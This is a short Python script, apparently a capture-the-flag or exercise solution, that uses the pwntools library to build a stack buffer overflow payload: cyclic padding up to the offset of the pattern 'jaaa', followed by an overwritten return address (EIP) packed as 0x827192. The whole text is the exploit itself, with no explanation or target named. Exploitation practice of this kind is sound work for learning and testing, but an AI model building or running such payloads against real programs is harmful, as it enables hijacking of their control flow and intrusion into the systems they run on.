from pwn import * 

padding = cyclic(cyclic_find('jaaa'))
eip = p32(0x827192)
payload = padding + eip
print(payload)
